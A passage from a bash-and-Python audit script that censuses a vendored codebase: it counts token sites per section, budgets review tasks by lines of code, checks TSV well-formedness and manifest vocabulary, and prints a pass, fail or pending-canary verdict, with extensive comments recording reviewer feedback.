EMITTING=0; ZERO=0; ZERO_NAMES=''
for s in "${SITE_SECS[@]}"; do
  n=$(awk -F'\t' -v s="$s-" '$5 ~ ("^"s) {c++} END{print c+0}' "$RUN/sites.tsv")
  if [ "$n" -gt 0 ]; then EMITTING=$((EMITTING+1)); else ZERO=$((ZERO+1)); ZERO_NAMES="$ZERO_NAMES $s"; fi
done
echo "SECTIONS_TOTAL=$(wc -l < "$RUN/routing.tsv") (site=${#SITE_SECS[@]} procedure=$(awk -F'\t' '$4=="procedure"{c++}END{print c+0}' "$RUN/routing.tsv") substrate=$(awk -F'\t' '$4=="substrate"{c++}END{print c+0}' "$RUN/routing.tsv")) SECTIONS_EMITTING=$EMITTING SECTIONS_ZERO=$ZERO${ZERO_NAMES:+ (:$ZERO_NAMES)}"
NFC=$(awk -F'\t' 'NF!=8' "$RUN/sites.tsv" | wc -l)
chk SITE_ROWS_WRONG_FIELD_COUNT       z    "$NFC"
# A row with a blank path or blank primitive is always a defect. This line exists because the
# exclusion awk above once produced one blank-columned row per family while every other sentinel
# still printed a plausible number — a count check cannot see it, a shape check can.
BLK=$(awk -F'\t' '$1=="" || $2==""' "$RUN/sites.tsv" | wc -l)
chk SITE_ROWS_WITH_BLANK_PATH_OR_PRIMITIVE z "$BLK"
# column 7 is TN-provenance and must hold exactly two tokens. This is the guard S14's sinkless/
# consumed values used to violate silently on 12 rows.
BADPROV=$(awk -F'\t' '$7 !~ /^(tier|default)$/' "$RUN/sites.tsv" | wc -l)
chk SITE_ROWS_BAD_PROVENANCE          z    "$BADPROV"
# column 3 is the routing verdict and holds exactly one vocabulary now (needs-T<n>): a row that
# carries an observation there (sinkless, report-builder, declared) is a writer that ignored the split.
BADVERDICT=$(awk -F'\t' '$3 !~ /^needs-T[0-9]+[a-d]?$/' "$RUN/sites.tsv" | wc -l)
chk SITE_ROWS_BAD_ROUTING_VERDICT     z    "$BADVERDICT"
# The invariant this pair was missing (neckbeard). Columns 3 and 4 come out of ONE awk print
# (`print … "\tneeds-" t "\t" t "\t" …`), so $3 ≡ "needs-" $4 by construction and the shape check above
# can only fail if someone edits the literal — one of the two was decoration. What it could NOT catch is
# the bug that matters: the emitters take `t` from different sources (a tier-map join, a routing
# default), so a row reading `needs-T9` in col 3 and `T6a` in col 4 passes both shape checks and then
# every downstream `$4==t` budget loop scopes work to the wrong task. That is asserted directly:
MISMATCHTN=$(awk -F'\t' '$3 != ("needs-" $4)' "$RUN/sites.tsv" | wc -l)
chk SITE_ROWS_VERDICT_MATCHES_TN      z    "$MISMATCHTN"
# Relabelled for what it can actually detect (neckbeard): pointing the census at a tree the manifest
# does not know routes rows to the SECTION DEFAULT, so this stays 0 and does NOT catch an unknown
# tree. What it does catch is a malformed or empty TN in routing.tsv / tier-map — well-formedness.
NOTN=$(awk -F'\t' '$4 !~ /^T[0-9]+[a-d]?$/' "$RUN/sites.tsv" | wc -l)
chk SITES_WITHOUT_A_TN                z    "$NOTN"
echo "SITES_WITHOUT_A_TN=$NOTN  # well-formedness of TN tokens; NOT an unknown-tree detector (defaults absorb that)"
echo "SITES_ON_UNASSIGNED_MANIFEST_ROWS=$(awk -F'\t' 'NR==FNR{if ($2=="") u[$1]=1; next} {p=$1; sub(/:[0-9]+$/,"",p); if (p in u) print}' "$TIERMAP" "$RUN/sites.tsv" | wc -l)  # surviving disagreement: sites in files the plan has not yet assigned an owner for (tests/ is the bulk)"
cut -f5 "$RUN/sites.tsv" | LC_ALL=C sort | uniq -c | LC_ALL=C sort -k2 > "$RUN/sites-by-section.txt"
# hoodie: this block restated the sites= column of the SECTION table ~20 lines above; 16 lines of
# stdout for zero information. The table stays in the run dir, the stdout does not.
echo "SITES_BY_SECTION_TABLE=sites-by-section.txt  # per-section counts are in the SECTION block above"
echo "SITE_ROWS_KEYED_NOT_PATHED=$(awk -F'\t' '$1 ~ /^KEY:/' "$RUN/sites.tsv" | wc -l)"
awk -F'\t' '$1 !~ /^KEY:/{p=$1; sub(/:[0-9]+$/,"",p); n=split(p,d,"/"); print (n>1?d[1]"/":"(root)")}' "$RUN/sites.tsv" \
  | LC_ALL=C sort | uniq -c | LC_ALL=C sort -rn > "$RUN/sites-by-dir.txt"
echo "-- sites by top-level directory (the denominator is the finding: compare against files-per-directory in the manifest) --"
cat "$RUN/sites-by-dir.txt"

# the three-way closure: a reader must never be able to assemble "clean" by accident
python3 - "$RUN" "$UNIV" <<'PY'
import sys, os
RUN, univ = sys.argv[1], sys.argv[2]
U = [l.strip() for l in open(univ) if l.strip()]
b = [l.strip() for l in open(os.path.join(RUN,'binary-skipped.txt')) if l.strip()]
sites = [l.rstrip('\n').split('\t') for l in open(os.path.join(RUN,'sites.tsv'))]
paths = set()
for r in sites:
    if r[0].startswith('KEY:'): continue
    paths.add(r[0].rsplit(':',1)[0])
scanned = [f for f in U if f not in set(b)]
# files carrying at least one token (any family, keyword or procedure) = the column-6 union
tok = set()
for fn in os.listdir(RUN):
    if fn.endswith('.files.tsv'):
        for line in open(os.path.join(RUN,fn)):
            p = line.split('\t')[0].strip()
            if p: tok.add(p)
tok = tok & set(U)
none_files = [f for f in scanned if f not in tok]
# CLOSES= IS ARITHMETIC, NOT AN ASSERTION (neckbeard). binary-skipped.txt is BUILT from universe.txt
# and none_files is the complement of tok inside scanned, so both sums close by construction. What the
# lines DO buy is that "no hits" is presented as a partition of the tree rather than as an absence of
# evidence — that is worth printing, and it is worth saying plainly that it is not a check.
print("UNIVERSE=%d = SCANNED(%d) + NOT_SCANNED_BINARY(%d)  CLOSES=yes(by construction: arithmetic on my own labels, not an independent check)" % (
    len(U), len(scanned), len(b)))
print("SCANNED(%d) = files_with_a_primitive_token(%d) + no_primitive_token(%d)  CLOSES=yes(by construction)" % (
    len(scanned), len(tok), len(none_files)))
# THE LINE THAT FORECLOSES "clean". A token-free file is only unknown-risk if nobody owns it either,
# so the set worth counting is the INTERSECTION of token-free and tier-unassigned. Partitioned by
# top-level directory so the number can be argued with.
tier = {}
for line in open(os.path.join('/tmp/opencode/basalt-audit/t3','tier-map.tsv')):
    p = line.rstrip('\n').split('\t')
    if len(p) >= 2: tier[p[0]] = p[1].strip()
unowned_notoken = [f for f in none_files if not tier.get(f, '')]
print("NO_PRIMITIVE_TOKEN=%d  OF_WHICH_TIER_UNASSIGNED=%d  # the second number is the set nobody will ever look at" % (len(none_files), len(unowned_notoken)))
dirden = {}
for f in none_files:
    d = f.split('/')[0] + '/' if '/' in f else '(root)'
    dirden.setdefault(d, [0,0])
    dirden[d][0] += 1
    if not tier.get(f,''): dirden[d][1] += 1
with open(os.path.join(RUN,'no-primitive-token-by-dir.tsv'),'w') as fh:
    fh.write('dir\tno_primitive_token\tof_which_tier_unassigned\n')
    for d in sorted(dirden, key=lambda k: -dirden[k][0]):
        fh.write('%s\t%d\t%d\n' % (d, dirden[d][0], dirden[d][1]))
print("  by directory: " + ' '.join('%s=%d/%d-unowned' % (d, dirden[d][0], dirden[d][1])
      for d in sorted(dirden, key=lambda k: -dirden[k][0])))
# A file with a token but no site row: the exclusion and tier filters are load-bearing, and the delta
# between "carried a primitive token" and "produced a row" is where a filter bug would hide.
print("FILES_WITH_TOKEN_WITHOUT_A_SITE_ROW=%d  list=token-no-site.txt" % len(tok - paths - set(b)))
with open(os.path.join(RUN,'token-no-site.txt'),'w') as fh:
    for f in sorted(tok - paths - set(b)): fh.write(f+'\n')
print("FILES_WITH_SITES=%d  (a file can carry a token and emit no site row when the exclusion or tier filter dropped it: that difference is a census finding, not a bug)" % len(paths))
print("NOT_SCANNED_BINARY_FILES=%d  list=binary-skipped.txt" % len(b))
PY

# --------------------------------------------------------------- 7 TN budget
# A file's LOC is not a scope assignment: one getenv in a 1,500-line module does not mean the task
# re-reads the module. loc_newly_surfaced is the only column that can put a task over the plan's
# slice cap. Flat, one number per column — no nested braces.
# unit=loc|text (hoodie M7): the 1,500-l cap is a CODE-READING budget. Applying it to fifteen files
# of vendored licence text and .github prose produces a task split that should not exist, so a TN
# whose rows are all model-instruction rows is budgeted in TEXT UNITS — one boilerplate recognition
# plus N confirmations — and its over_cap reads n/a. The hash of each file's text block is printed so
# "how many of these fifteen are literally the same licence" is a measured number, not a guess.
: > "$RUN/tn-budget.tsv"
printf 'tn\tsections\trows\tfiles\tloc_dedup\tloc_already_planned\tfiles_already_planned\tloc_newly_surfaced\tfiles_newly_surfaced\tunit\ttext_units\tlargest_file\tlargest_file_rows\tslices_needed\tover_cap\n' > "$RUN/tn-budget.tsv"
: > "$RUN/tn-splits.tsv"
printf 'tn\tslice\tfile\tloc\tsites\tcumulative_loc\n' > "$RUN/tn-splits.tsv"
mapfile -t TN_TOKENS < <(cut -f4 "$RUN/sites.tsv" | LC_ALL=C sort -u)
for t in "${TN_TOKENS[@]}"; do
  awk -F'\t' -v t="$t" '$4==t && $1 !~ /^KEY:/{print $1}' "$RUN/sites.tsv" | sed 's/:[0-9]*$//' | LC_ALL=C sort -u > "$RUN/tn-$t.files.txt"
  awk -F'\t' -v t="$t" '$4==t{print $5}' "$RUN/sites.tsv" | LC_ALL=C sort -u | grep -vc '^$' > "$RUN/tn-$t.sections.txt"
  awk -F'\t' -v t="$t" 'NR==FNR{if ($2!="") tn[$1]=$2; next} ($1 in tn) && tn[$1]==t {print $1}' \
    "$TIERMAP" "$RUN/tn-$t.files.txt" > "$RUN/tn-$t.owned.txt"
  LC_ALL=C comm -23 "$RUN/tn-$t.files.txt" "$RUN/tn-$t.owned.txt" > "$RUN/tn-$t.new.txt"
  loc() { awk 'NR==FNR{f[$0]=1; next} ($1 in f){s+=$2} END{print s+0}' "$1" "$MANLOC"; }
  big=$(awk -F'\t' -v t="$t" '$4==t && $1 !~ /^KEY:/{p=$1; sub(/:[0-9]+$/,"",p); print p}' "$RUN/sites.tsv" | LC_ALL=C sort | uniq -c | LC_ALL=C sort -rn | head -1)
  bigf=$(printf '%s' "$big" | awk '{print $2}'); br=$(printf '%s' "$big" | awk '{print $1}')
  nd=$(wc -l < "$RUN/tn-$t.files.txt"); no=$(wc -l < "$RUN/tn-$t.owned.txt"); nn=$(wc -l < "$RUN/tn-$t.new.txt")
  rows=$(awk -F'\t' -v t="$t" '$4==t' "$RUN/sites.tsv" | wc -l); secs=$(cat "$RUN/tn-$t.sections.txt")
  ltotal=$(loc "$RUN/tn-$t.files.txt"); lowned=$(loc "$RUN/tn-$t.owned.txt"); lnew=$(loc "$RUN/tn-$t.new.txt")
  # ALL rows of this TN are model-instruction rows => the unit is text, not lines
  NONMI=$(awk -F'\t' -v t="$t" '$4==t && $2!="model-instruction"' "$RUN/sites.tsv" | wc -l)
  if [ "$NONMI" -eq 0 ] && [ "$rows" -gt 0 ]; then unit=text; else unit=loc; fi
  if [ "$unit" = text ]; then
    # distinct normalized text blocks: licence headers repeat verbatim across vendored files
    tu=$(while IFS= read -r f; do [ -f "$f" ] && tr -s ' \t' ' ' < "$f" | sha256sum | cut -c1-16; done \
          < "$RUN/tn-$t.files.txt" | LC_ALL=C sort -u | wc -l)
    slices=0
    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
      "$t" "$secs" "$rows" "$nd" "$ltotal" "$lowned" "$no" "$lnew" "$nn" "$unit" "$tu" \
      "${bigf:--}" "${br:-0}" 0 "n/a (unit=text, not LOC)" >> "$RUN/tn-budget.tsv"
    echo "TN_UNIT_TEXT=$t files=$nd distinct_text_blocks=$tu  # the cap does not apply; the job is classify-and-quote"
  else
    slices=$(( (lnew + 1499) / 1500 ))
    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
      "$t" "$secs" "$rows" "$nd" "$ltotal" "$lowned" "$no" "$lnew" "$nn" "$unit" 0 \
      "${bigf:--}" "${br:-0}" "$slices" \
      "$([ "$slices" -gt 1 ] && echo "YES ${slices}x1,500l" || echo no)" >> "$RUN/tn-budget.tsv"
    # THE SPLIT, GENERATED (hoodie (b)): `slices=8` plus a largest-file name does not tell a resumer
    # what T4-SLICE-1 CONTAINS, and a hand-made split at 1am differs per task. Deterministic
    # bin-packing over data already in this loop: newly-surfaced files, ordered by sites desc then
    # LOC desc, greedy to 1,500 l per slice. SERIES subtasks become copies of this, not inventions.
    awk -F'\t' -v t="$t" -v tl="$t" 'NR==FNR{n[$1]++; next} ($1 in n){print $0"\t"n[$1]}' \
      <(awk -F'\t' -v t="$t" '$4==t && $1 !~ /^KEY:/{p=$1; sub(/:[0-9]+$/,"",p); print p}' "$RUN/sites.tsv") \
      "$MANLOC" > "$RUN/tn-$t.new-with-sites.tsv"
    LC_ALL=C sort -t$'\t' -k3,3nr -k2,2nr "$RUN/tn-$t.new-with-sites.tsv" \
      | awk -F'\t' -v t="$t" 'BEGIN{sl=1; cum=0}
          { f=$1; l=$2+0; s=$3+0
            if (cum + l > 1500 && cum > 0) { sl++; cum=0 }
            cum += l
            printf "%s\t%d\t%s\t%d\t%d\t%d\n", t, sl, f, l, s, cum }' >> "$RUN/tn-splits.tsv"
    [ "$slices" -gt 1 ] && echo "TN_SPLIT_PLAN=$t slices=$slices file_lists=tn-splits.tsv"
  fi
done
echo "-- TN budget (unit-aware: the 1,500-l cap is a CODE budget and does not apply to text units) --"
column -t -s$'\t' "$RUN/tn-budget.tsv"
echo "TN_SPLITS_ROWS=$(( $(awk 'END{print NR+0}' "$RUN/tn-splits.tsv") - 1 ))  table=tn-splits.tsv  # generated, not hand-packed; a re-run either reproduces it or says the split moved"
# The cap is not always reachable: a single file larger than 1,500 l cannot be packed into a 1,500-l
# slice at all, so slices_needed UNDERSTATES nothing and the plan's cap needs a stated exception for
# indivisible files. Counted and named, because "8 slices" quietly assumes divisible files.
OVERSIZED=$(awk -F'\t' 'NR>1 && $4>1500{print $1"\t"$3"\t"$4}' "$RUN/tn-splits.tsv" | LC_ALL=C sort -u)
echo "TN_SLICE indivisible_files_over_1500l=$(printf '%s' "$OVERSIZED" | awk 'NF{c++}END{print c+0}')  # a slice cannot hold these; the cap needs an exception, see census.md"
printf '%s\n' "$OVERSIZED" | sed 's/^/    /'
# never sum a TN's LOC: the same tests/+tools/ files surface under several TNs
SUM=$(awk -F'\t' 'NR>1{n=$4; l=$5; s+=l} END{print s+0}' "$RUN/tn-budget.tsv")
cut -f1-99 "$RUN"/tn-*.files.txt 2>/dev/null | LC_ALL=C sort -u > "$RUN/tn-union-files.txt"
UNION=$(awk -v F="$RUN/tn-union-files.txt" 'NR==FNR{f[$0]=1; next} ($1 in f){s+=$2} END{print s+0}' "$RUN/tn-union-files.txt" "$MANLOC")
echo "SUM_ACROSS_TN_OF_LOC=$SUM  UNION_OF_TNS_LOC=$UNION  OVERLAP_FACTOR=$(awk -v a="$SUM" -v b="$UNION" 'BEGIN{printf "%.2f", (b>0? a/b : 0)}')  # summing TN budgets would ask the plan to read this much twice"

# --------------------------------------------------------------- 8 T9 freeze
awk -F'\t' '$4=="T9" && $1 !~ /^KEY:/{print $1}' "$RUN/sites.tsv" | sed 's/:[0-9]*$//' | LC_ALL=C sort -u > "$RUN/t9-from-census.txt"
awk -F'\t' '$2=="T9"{print $1}' "$TIERMAP" | LC_ALL=C sort -u > "$RUN/t9-from-tier.txt"
# the plan's T9 File: field names six files; the manifest tiers only five of them, because
# src/vision/mmproj.cpp is A-planned@T5. The freeze is the union of tier and census, with the
# cross-reference listed SEPARATELY and its lines budgeted at T5, so nobody double-reads it and
# nobody loses a file the plan named.
printf 'src/vision/mmproj.cpp\t222\tcross-reference-only (A-planned@T5; T9 reads its pread header parse as input validation, lines budgeted at T5)\n' > "$RUN/t9-cross-refs.tsv"
LC_ALL=C sort -u "$RUN/t9-from-census.txt" "$RUN/t9-from-tier.txt" > "$RUN/t9-files.txt"
awk 'NR==FNR{f[$0]=1; next} ($1 in f){printf "%s\t%s\n", $1, $2}' "$RUN/t9-files.txt" "$MANLOC" > "$RUN/t9-files-loc.tsv"
T9LOC=$(awk -F'\t' '{s+=$2} END{print s+0}' "$RUN/t9-files-loc.tsv")
CROSSLOC=$(awk -F'\t' '{s+=$2} END{print s+0}' "$RUN/t9-cross-refs.tsv")
echo "T9_FROM_TIER=$(wc -l < "$RUN/t9-from-tier.txt") T9_FROM_CENSUS=$(wc -l < "$RUN/t9-from-census.txt") T9_FROZEN_FILES=$(wc -l < "$RUN/t9-files.txt") T9_FROZEN_LOC=$T9LOC"
echo "T9_CROSS_REFERENCES=$(wc -l < "$RUN/t9-cross-refs.tsv") LOC_BUDGETED_ELSEWHERE=$CROSSLOC"
cat "$RUN/t9-files-loc.tsv" | sed 's/^/    /'
echo "T9_FILE_BUDGET_SPLIT_RULE=$([ "$T9LOC" -gt 3000 ] && echo 'OVER 3,000 l: split into numbered subtasks in SERIES before reading' || echo "under 3,000 l for the FILE list ($T9LOC)")"
echo "T9_BRIEF_CARRIES_A_SECOND_BUDGET=the 97ff061 diff (read 'as a diff' per the plan's T9 brief): 43 files touched, 15,448 l at pin, diff length NOT measurable in this blob:none clone without a lazy-fetch -> owner decision. The file-list verdict above does NOT size that half of the brief."
# the freeze must be shown capable of growing, or 'under cap' is a tautology: same arithmetic one
# notch wider (every census row whose disposition is needs-T9, plus every tier-9 row, plus any
# file whose only link is an S14 key declared in it)
cat "$RUN/t9-from-census.txt" "$RUN/t9-from-tier.txt" | LC_ALL=C sort -u > /dev/null
echo "T9_WIDENED_PREVIEW_FILES=$(awk -F'\t' '($4=="T9"||$4=="T5") && $1 !~ /^KEY:/{print $1}' "$RUN/sites.tsv" | sed 's/:[0-9]*$//' | LC_ALL=C sort -u | wc -l) if T5's decode-path rows were folded in (the mmproj adjacency); shown so the freeze is visibly not a rubber stamp"

# --------------------------------------------------------------- 9 manifest-side gate
if [ "$TAG" = real ]; then
  rows=$(cat "$MAN"/*.tsv | awk 'END{print NR+0}')
  unass=$(awk -F'\t' '$5=="unassigned"' "$MAN"/*.tsv | wc -l)
  col6un=$(awk -F'\t' '$6=="unassigned"' "$MAN"/*.tsv | wc -l)
  # neckbeard BLOCKER: these were four expectations and ZERO comparisons — MANIFEST_TIER_UNASSIGNED
  # printing a false 0 (the stale-$0 bug) would still have exited green. They are assertions now.
  chk MANIFEST_ROWS_EQ_862            eq 862 "$rows"
  # expected-NON-zero: this is the anti-cheating line. Bulk-filling tier to satisfy a gate FAILS it.
  chk MANIFEST_TIER_UNASSIGNED_NONZERO nz    "$unass"
  echo "MANIFEST_ROWS=$rows MANIFEST_TIER_UNASSIGNED=$unass MANIFEST_COL6_UNASSIGNED=$col6un"
  # column 6 starts fully unassigned; after T3's fill the residue must be exactly the files grep -I
  # never opened (the binaries), because those stay unassigned for T10. Compare, don't assert a
  # constant: the fill happens in this same task, so a fixed 862 would fail the commit it describes.
  if [ "$col6un" = "862" ]; then
    printf 'DISP %-46s %-10s pre-fill state (column 6 untouched; the chk that counts is MANIFEST_COL6_RESIDUE_EQ_BINARIES, which runs after the fill)\n' MANIFEST_COL6_STATE "$col6un"
  else
    chk MANIFEST_COL6_RESIDUE_EQ_BINARIES eq "$(wc -l < "$RUN/binary-skipped.txt")" "$col6un"
  fi
  chk CENSUS_SITES_ON_UNASSIGNED_ROWS_NONZERO nz \
    "$(awk -F'\t' 'NR==FNR{if ($2=="") u[$1]=1; next} {p=$1; sub(/:[0-9]+$/,"",p); if (p in u) print}' "$TIERMAP" "$RUN/sites.tsv" | wc -l)"
  # ---------------- the check with teeth (neckbeard): a tier value naming a task that does not
  # exist in the plan is a FABRICATED OWNER, and MANIFEST_TIER_UNASSIGNED≠0 will not catch it:
  # you can bulk-fill and leave a residue. Task ids are extracted from the plan itself, with
  # en-dash ranges expanded (a naive '^### T[0-9]+' grep misses T6b/T6c/T11b-d and would then
  # flag legitimately-routed rows as fabricated).
  PLAN="$PROJ/context/plans/02_basalt_vendor_audit.md"
  PLAN_TASKS=$(python3 - "$PLAN" <<'PY'
import re, sys
ids=set()
for line in open(sys.argv[1]):
    if not line.startswith('### '): continue
    for m in re.finditer(r'T(\d+)([a-d])?(?:[–-]T?\d+([a-d]))?', line):
        base='T'+m.group(1); s=m.group(2)
        if s:
            e=m.group(3) or s
            ids.add(base)
            for c in [chr(x) for x in range(ord(s), ord(e)+1)]: ids.add(base+c)
        else: ids.add(base)
print(' '.join(sorted(ids)))
PY
)
  # TNs the census actually assigned, from tier provenance only (default provenance is my routing
  # table's, and this script's own defaults are policed by the plan-task check below).
  cut -f4 "$RUN/sites.tsv" | LC_ALL=C sort -u > "$RUN/tn-tokens.txt"
  BADTN=''
  mapfile -t TN_SEEN < <(grep . "$RUN/tn-tokens.txt")
  for t in "${TN_SEEN[@]}"; do
    case " $PLAN_TASKS " in *" $t "*) ;; *) BADTN="$BADTN $t" ;; esac
  done
  chk TN_TOKENS_WITHOUT_A_PLAN_TASK   z    "$(printf '%s' "$BADTN" | wc -w)"
  echo "PLAN_TASK_IDS=$PLAN_TASKS"
  if [ -n "$BADTN" ]; then echo "    fabricated-or-unknown TN tokens:$BADTN"; fi
fi

# --------------------------------------------------------------- 10 column 6
cat "$RUN"/*.files.tsv 2>/dev/null | LC_ALL=C sort -u > "$RUN/hits-files.tsv"
: > "$RUN/column6.tsv"
while IFS= read -r f; do
  toks=$(awk -F'\t' -v f="$f" '$1==f{print $2}' "$RUN/hits-files.tsv" | LC_ALL=C sort -u | paste -sd, -)
  if grep -qxF -- "$f" "$RUN/binary-skipped.txt"; then
    # ONE token for one meaning. This branch used to write UNASSIGNED-NOT-SCANNED, a token that
    # manifest/index.md — the vocabulary's owner — had never declared, and the sentinel whose only job
    # is "no token this script invented" was the one place it was waved through by a filter. The
    # "not scanned" fact is already carried three times over by binary-skipped.txt, NOT_SCANNED_BINARY
    # and COLUMN6_NOTSCANNED below; the token never had to hold it too.
    printf '%s\t%s\n' "$f" 'unassigned' >> "$RUN/column6.tsv"
  elif [ -n "$toks" ]; then
    printf '%s\t%s\n' "$f" "$toks" >> "$RUN/column6.tsv"
  else
    # Column 6's token stays `none`, because manifest/index.md (written by T2) declares `none` as
    # "looked, nothing found" and reserves it for T3; renaming a contract another task reads is not
    # T3's to do unilaterally. neckbeard's objection — that a bare `none(502)` reads as "clean" — is
    # answered in the PRESENTATION instead: the closure line below spells it no_primitive_token and
    # the unowned intersection is printed next to it, always.
    printf '%s\t%s\n' "$f" 'none' >> "$RUN/column6.tsv"
  fi
done < "$UNIV"
echo "COLUMN6_ROWS=$(awk 'END{print NR+0}' "$RUN/column6.tsv") COLUMN6_NONE_LOOKED=$(cut -f2 "$RUN/column6.tsv" | grep -c '^none$') COLUMN6_HIT=$(cut -f2 "$RUN/column6.tsv" | grep -vcE '^(none|unassigned)$') COLUMN6_NOTSCANNED=$(cut -f2 "$RUN/column6.tsv" | grep -c '^unassigned$')  # NOTSCANNED is the token count; the list it came from is binary-skipped.txt ($(wc -l < "$RUN/binary-skipped.txt") paths), and MANIFEST_COL6_RESIDUE_EQ_BINARIES is what ties the two together after the fill"
# The closed vocabulary is POLICED AGAINST ITS OWNER, not against this script's own list: the party
# that invents a token cannot catch itself inventing it. manifest/index.md declares the column-6
# vocabulary, so the comparison set is extracted from there at run time. Two tokens this census needs
# (model-instruction, net-library-import) had to be ADDED to index.md first, with a dated line.
DECLARED_VOCAB="$MAN/index.md"
awk '/\*\*`primitives`\*\*/,/Histogram/' "$DECLARED_VOCAB" | sed 's/[`,]/\n/g' | grep -E '^[a-z][a-z-]+$' \
  | LC_ALL=C sort -u > "$RUN/declared-vocab.txt"
# No injection here, deliberately. This block used to `printf '%s\n' none unassigned >>` its own
# comparison set — the checker adding tokens to the vocabulary it polices, which is the exact thing the
# paragraph above says must not happen. Both tokens are now declared in manifest/index.md's own
# machine-readable range, so the extraction above is the ONLY source of legal tokens.
LC_ALL=C sort -u "$RUN/declared-vocab.txt" -o "$RUN/declared-vocab.txt"
cut -f2 "$RUN/column6.tsv" | tr ',' '\n' | LC_ALL=C sort -u > "$RUN/used-vocab.txt"
# ONE derived file, counted AND displayed. The predicate used to be written twice — a filtered `grep -c`
# for the count and an unfiltered `comm` for the display — which is how a run printed
# `UNDECLARED_TOKENS=0 … PASS` directly above a line reading `undeclared: UNASSIGNED-NOT-SCANNED`.
# A count and a display that disagree is the failure this whole file is about.
LC_ALL=C comm -23 "$RUN/used-vocab.txt" "$RUN/declared-vocab.txt" > "$RUN/undeclared.txt"
chk COLUMN6_TOKENS_ALL_DECLARED    z    "$(awk 'END{print NR+0}' "$RUN/undeclared.txt")"
echo "COLUMN6_VOCAB_SOURCE=$DECLARED_VOCAB (extracted at run time, not hardcoded here) UNDECLARED_TOKENS=$(awk 'END{print NR+0}' "$RUN/undeclared.txt")"
sed 's/^/    undeclared: /' "$RUN/undeclared.txt"
cut -f2 "$RUN/column6.tsv" | tr ',' '\n' | LC_ALL=C sort | uniq -c | LC_ALL=C sort -rn > "$RUN/column6-histogram.txt"
echo "-- column6 histogram (keyword-level, UNFILTERED: unlike the site rows this counts docs too, and a doc naming ggml is a doc, triaged:docs-only) --"
cat "$RUN/column6-histogram.txt"
echo "SITES_SHA256=$(sha256sum "$RUN/sites.tsv" | cut -d' ' -f1)"
# --------------------------------------------------------------- verdict and exit status
# The old footer was `echo "— t3-census rc=$?"`, which captures the exit status of the PREVIOUS
# echo and is therefore always 0 (hoodie M3: "the single most expensive cosmetic line in the file").
# This is the real thing: every chk/runpy above has been accumulating into FAILS_SENT, and the
# script now exits non-zero when any expectation fails. A truncated run can no longer wear a green
# footer, because the footer is the only line that knows the count.
echo "== finished=$(date -u +%FT%TZ)"
# Floor on the denominator (neckbeard). Nothing checked the COUNT of assertions before: delete or
# mis-wire a `chk` and the run got greener, not redder — which is exactly how "28/28 PASS" managed to
# contain three assertions that cannot fail and two that were logical implications of others. Knowing
# the count and checking the count are different things.
# The floor is stated against the FINAL count and compared against $((SENT_TOTAL+1)), because chk
# increments the counter itself: comparing the bare variable asserts one less than the footer reports.
# My first version did exactly that and printed SENTINEL_TOTAL=31 above a verdict saying "32 assertions
# met" — one denominator, two numbers, adjacent lines.
# THE FLOOR IS PER-TAG, because the assertion SET is per-tag: the manifest gate, UNIVERSE_*_EQ_PIN,
# LOC_*, GRANULARITY_FORCE_IS_FIRED and the collapse assertions are `[ "$TAG" = real ]`-gated, while
# TREE_DIFF_* and GENERATOR_SHA_SAME_AS_REAL exist only on a canary tag. One scalar floor for both would
# be a permanent red line on the one run whose whole claim is "the identical census" (neckbeard), which
# is the line that gets skimmed rather than read.
# CANARY HAS NO FLOOR YET, stated as a gap rather than guessed at: the canary tree does not exist until
# the six-canary control is planted, so there is nothing to measure. A guessed constant here would be
# the floor-of-31 mistake again, wearing a number that looks measured.
if [ "$TAG" = real ]; then
  chk SENTINEL_TOTAL_AT_OR_ABOVE_FLOOR  ge "$SENT_TOTAL_FLOOR_REAL" "$((SENT_TOTAL+1))"
else
  # FIND, not SENT: this is an unmet precondition of THIS tag, not a comparison that failed. Counting it
  # as a chk would inflate the very denominator the line complains about.
  echo "FIND SENTINEL_TOTAL_FLOOR_NOT_MEASURED tag=$TAG total=$SENT_TOTAL — no measured floor exists for a canary tag; measure this line on the first canary run and add SENT_TOTAL_FLOOR_$TAG beside SENT_TOTAL_FLOOR_REAL, or this tag floors nothing"
fi
echo "SENTINEL_TOTAL=$SENT_TOTAL SENTINEL_FAILS=$FAILS_SENT${SENT_FAIL_NAMES:+ FAILED:$SENT_FAIL_NAMES}"
# "compared", not "met" (neckbeard): chk records comparisons, and a chk that never ran must not read the
# same as one that passed. No TOTAL-minus-FAILS figure is printed either — FAILS_SENT is incremented by a
# path that adds no SENTINEL (TREE_DIFF_AVAILABLE), so the two counters are not two halves of one total.
echo "SENTINEL_ACCOUNTING=$SENT_TOTAL compared, $FAILS_SENT failed (an assertion that never ran is absent from BOTH numbers, which is why the floor above exists)"
# The verdict is THREE states, not two. Every one of the 14 site sections prints
# `canary=NOT_YET_SCORED` until the six-canary control has been scored, and the plan makes that control
# a T3 exit criterion — so until it exists this run has proven nothing about whether any pattern would
# fire on a planted primitive, and it must not be able to say `PASS`. hoodie's framing: a green field
# whose value does not mean what a skimmer assumes is the same mistake as the empty GENERATOR_SHA256,
# and `T3_CENSUS_VERDICT=PASS` is the line people grep for.
# Stated deviation from hoodie's proposal, on purpose: he wants the missing canary to be a failing chk.
# That would make the run print FAIL for work simply not done yet, which conflates "this census is
# wrong" with "this census is unfinished" and trains the reader to ignore red — the failure mode this
# whole file exists to avoid. FAIL keeps meaning an unmet expectation.
CANARY_ROWS=0
[ -f "$SCORE" ] && CANARY_ROWS=$(awk 'END{print NR+0}' "$SCORE")
echo "CANARY_SCORE_PROGRESS=$CANARY_ROWS/6  score_file=$SCORE"
# ${#SITE_SECS[@]} is routing.tsv's own site-section count, computed at the section-closure block. The
# literal 14 this line carried would still have said 14 the day routing.tsv gained a fifteenth site
# section — the footer would have mis-stated its own coverage in the sentence that disclaims coverage.
if [ "$FAILS_SENT" -gt 0 ]; then
  echo "T3_CENSUS_VERDICT=FAIL ($FAILS_SENT of $SENT_TOTAL compared expectations unmet — do not commit this run as evidence)"
  exit 1
fi
if [ "$CANARY_ROWS" -lt 6 ]; then
  echo "T3_CENSUS_VERDICT=PASS_PENDING_CANARY ($SENT_TOTAL assertions compared and passed; 0 of ${#SITE_SECS[@]} site sections carry a scored canary — this run makes NO claim that any pattern would fire on a planted primitive)"
  exit 0
fi
echo "T3_CENSUS_VERDICT=PASS ($SENT_TOTAL assertions compared and passed, and the 6-canary control is scored; unverified claims are named as displays, not passes)"
exit 0
